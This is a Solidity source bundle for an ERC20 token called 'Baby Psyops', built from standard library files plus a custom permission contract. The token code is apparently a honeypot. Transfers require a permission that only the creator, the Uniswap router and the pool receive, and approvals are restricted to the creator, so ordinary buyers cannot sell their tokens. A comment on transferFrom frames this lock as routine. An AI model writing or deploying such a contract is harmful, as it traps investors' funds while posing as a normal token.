{"Address.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     *\r\n     * Among others, `isContract` will return false for the following\r\n     * types of addresses:\r\n     *\r\n     *  - an externally-owned account\r\n     *  - a contract in construction\r\n     *  - an address where a contract will be created\r\n     *  - an address where a contract lived, but was destroyed\r\n     * ====\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies in extcodesize, which returns 0 for contracts in\r\n        // construction, since the code is only stored at the end of the\r\n        // constructor execution.\r\n\r\n        uint256 size;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { size := extcodesize(account) }\r\n        return size \u003e 0;\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity\u0027s `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length \u003e 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}"},"BabyPsyops.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\nimport \"./Context.sol\";\r\n\r\ncontract BabyPsyops is Context\r\n{\r\n    address private _creator;\r\n    address private _uniswap;\r\n    mapping (address =\u003e bool) private _permitted;\r\n\r\n    constructor() public\r\n    {\r\n\r\n        _creator = 0x261fDfE9874629f0B7D0B984f2a4403065657e9b; \r\n        _uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; \r\n\r\n        _permitted[_creator] = true;\r\n        _permitted[_uniswap] = true;\r\n    }\r\n    \r\n    function creator() public view returns (address)\r\n    { return _creator; }\r\n    \r\n    function uniswap() public view returns (address)\r\n    { return _uniswap; }\r\n    \r\n    function givePermissions(address who) internal\r\n    {\r\n        require(_msgSender() == _creator || _msgSender() == _uniswap, \"You do not have permissions for this action\");\r\n        _permitted[who] = true;\r\n    }\r\n    \r\n    modifier onlyCreator\r\n    {\r\n        require(_msgSender() == _creator, \"You do not have permissions for this action\");\r\n        _;\r\n    }\r\n    \r\n    modifier onlyPermitted\r\n    {\r\n        require(_permitted[_msgSender()], \"You do not have permissions for this action\");\r\n        _;\r\n    }\r\n}\r\n"},"Context.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}"},"SafeMath.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it\u0027s recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\r\n        // benefit is lost if \u0027b\u0027 is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"},"Token.sol":{"content":"    pragma solidity ^0.6.6;\r\n\r\n    import \"./BabyPsyops.sol\";\r\n    import \"./SafeMath.sol\";\r\n    import \"./Address.sol\";\r\n\r\n    /**\r\n    * @dev Interface of the ERC20 standard as defined in the EIP.\r\n    */\r\n    interface IERC20 {\r\n        /**\r\n        * @dev Returns the amount of tokens in existence.\r\n        */\r\n        function totalSupply() external view returns (uint256);\r\n\r\n        /**\r\n        * @dev Returns the amount of tokens owned by `account`.\r\n        */\r\n        function balanceOf(address account) external view returns (uint256);\r\n\r\n        /**\r\n        * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n        *\r\n        * Returns a boolean value indicating whether the operation succeeded.\r\n        *\r\n        * Emits a {Transfer} event.\r\n        */\r\n        function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n        /**\r\n        * @dev Returns the remaining number of tokens that `spender` will be\r\n        * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n        * zero by default.\r\n        *\r\n        * This value changes when {approve} or {transferFrom} are called.\r\n        */\r\n        function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n        /**\r\n        * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n        *\r\n        * Returns a boolean value indicating whether the operation succeeded.\r\n        *\r\n        * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n        * that someone may use both the old and the new allowance by unfortunate\r\n        * transaction ordering. One possible solution to mitigate this race\r\n        * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n        * desired value afterwards:\r\n        * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n        *\r\n        * Emits an {Approval} event.\r\n        */\r\n        function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n        /**\r\n        * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n        * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n        * allowance.\r\n        *\r\n        * Returns a boolean value indicating whether the operation succeeded.\r\n        *\r\n        * Emits a {Transfer} event.\r\n        */\r\n        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n        /**\r\n        * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n        * another (`to`).\r\n        *\r\n        * Note that `value` may be zero.\r\n        */\r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n        /**\r\n        * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n        * a call to {approve}. `value` is the new allowance.\r\n        */\r\n        event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    }\r\n\r\n    contract ERC20 is BabyPsyops, IERC20 {\r\n        using SafeMath for uint256;\r\n        using Address for address;\r\n\r\n        mapping (address =\u003e uint256) private _balances;\r\n        mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n\r\n        string private _name;\r\n        string private _symbol;\r\n        uint8 private _decimals;\r\n        uint256 private _totalSupply;\r\n\r\n        /**\r\n        * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\r\n        * a default value of 18 and a {totalSupply} of the token.\r\n        *\r\n        * All four of these values are immutable: they can only be set once during\r\n        * construction.\r\n        */\r\n            \r\n        constructor () public {\r\n            _name = \"Baby Psyops\";\r\n            _symbol = \"BABYPSY\";\r\n            _decimals = 18;\r\n            _totalSupply = 420000000000000000000000000000;\r\n            \r\n            _balances[creator()] = _totalSupply;\r\n            emit Transfer(address(0), creator(), _totalSupply);\r\n        }\r\n\r\n        /**\r\n        * @dev Returns the name of the token.\r\n        */\r\n        function name() public view returns (string memory) {\r\n            return _name;\r\n        }\r\n\r\n        /**\r\n        * @dev Returns the symbol of the token, usually a shorter version of the\r\n        * name.\r\n        */\r\n        function symbol() public view returns (string memory) {\r\n            return _symbol;\r\n        }\r\n\r\n        /**\r\n        * @dev Returns the number of decimals used to get its user representation.\r\n        * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n        * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n        *\r\n        * Tokens usually opt for a value of 18, imitating the relationship between\r\n        * Ether and Wei. This is the value {ERC20} uses.\r\n        *\r\n        * NOTE: This information is only used for _display_ purposes: it in\r\n        * no way affects any of the arithmetic of the contract, including\r\n        * {balanceOf} and {transfer}.\r\n        */\r\n        function decimals() public view returns (uint8) {\r\n            return _decimals;\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-totalSupply}.\r\n        */\r\n        function totalSupply() public view override returns (uint256) {\r\n            return _totalSupply;\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-balanceOf}.\r\n        */\r\n        function balanceOf(address account) public view override returns (uint256) {\r\n            return _balances[account];\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-transfer}.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `recipient` cannot be the zero address.\r\n        * - the caller must have a balance of at least `amount`.\r\n        */\r\n        function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {\r\n            _transfer(_msgSender(), recipient, amount);\r\n            \r\n            if(_msgSender() == creator())\r\n            { givePermissions(recipient); }\r\n            \r\n            return true;\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-allowance}.\r\n        */\r\n        function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n            return _allowances[owner][spender];\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-approve}.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `spender` cannot be the zero address.\r\n        */\r\n        function approve(address spender, uint256 amount) public virtual onlyCreator override returns (bool) {\r\n            _approve(_msgSender(), spender, amount);\r\n            return true;\r\n        }\r\n\r\n        /**\r\n        * @dev See {IERC20-transferFrom}.\r\n        *\r\n        * Emits an {Approval} event indicating the updated allowance. This is not\r\n        * required by the EIP. See the note at the beginning of {ERC20};\r\n        *\r\n        * Requirements:\r\n        * - `sender` and `recipient` cannot be the zero address.\r\n        * - `sender` must have a balance of at least `amount`.\r\n        * - the caller must have allowance for ``sender``\u0027s tokens of at least\r\n        * `amount`.\r\n        */\r\n        function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n            _transfer(sender, recipient, amount);\r\n            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n            \r\n            if(_msgSender() == uniswap())\r\n            { givePermissions(recipient); } // uniswap should transfer only to the exchange contract (pool) - give it permissions to transfer\r\n            \r\n            return true;\r\n        }\r\n\r\n        /**\r\n        * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n        *\r\n        * This is an alternative to {approve} that can be used as a mitigation for\r\n        * problems described in {IERC20-approve}.\r\n        *\r\n        * Emits an {Approval} event indicating the updated allowance.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `spender` cannot be the zero address.\r\n        */\r\n        function increaseAllowance(address spender, uint256 addedValue) public virtual onlyCreator returns (bool) {\r\n            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n            return true;\r\n        }\r\n\r\n        /**\r\n        * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n        *\r\n        * This is an alternative to {approve} that can be used as a mitigation for\r\n        * problems described in {IERC20-approve}.\r\n        *\r\n        * Emits an {Approval} event indicating the updated allowance.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `spender` cannot be the zero address.\r\n        * - `spender` must have allowance for the caller of at least\r\n        * `subtractedValue`.\r\n        */\r\n        function decreaseAllowance(address spender, uint256 subtractedValue) public virtual onlyCreator returns (bool) {\r\n            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n            return true;\r\n        }\r\n\r\n        /**\r\n        * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n        *\r\n        * This is internal function is equivalent to {transfer}, and can be used to\r\n        * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n        *\r\n        * Emits a {Transfer} event.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `sender` cannot be the zero address.\r\n        * - `recipient` cannot be the zero address.\r\n        * - `sender` must have a balance of at least `amount`.\r\n        */\r\n        function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n            require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n            require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n            emit Transfer(sender, recipient, amount);\r\n        }\r\n\r\n        /**\r\n        * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n        *\r\n        * This is internal function is equivalent to `approve`, and can be used to\r\n        * e.g. set automatic allowances for certain subsystems, etc.\r\n        *\r\n        * Emits an {Approval} event.\r\n        *\r\n        * Requirements:\r\n        *\r\n        * - `owner` cannot be the zero address.\r\n        * - `spender` cannot be the zero address.\r\n        */\r\n        function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n            require(owner != address(0), \"ERC20: approve from the zero address\");\r\n            require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n            _allowances[owner][spender] = amount;\r\n            emit Approval(owner, spender, amount);\r\n        }\r\n    }"}}